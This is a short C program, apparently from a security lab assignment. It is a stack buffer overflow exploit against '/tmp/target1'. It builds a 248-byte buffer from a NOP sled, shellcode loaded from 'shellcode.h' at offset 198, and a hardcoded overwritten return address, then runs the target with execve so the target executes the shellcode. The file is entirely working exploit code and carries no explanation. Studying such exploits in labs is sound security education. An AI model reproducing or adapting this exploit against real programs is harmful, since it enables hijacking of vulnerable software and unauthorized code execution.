
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char buffer[248];
  memset(buffer, 0x90, 248);
  char *args[3];
  char *env[1];
  int i;


for(i = 0; i < strlen(shellcode); i++) {
        buffer[198+i] = shellcode[i];
}
strncpy(buffer+244, "\xf5\xfe\xff\xbf", 4);

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

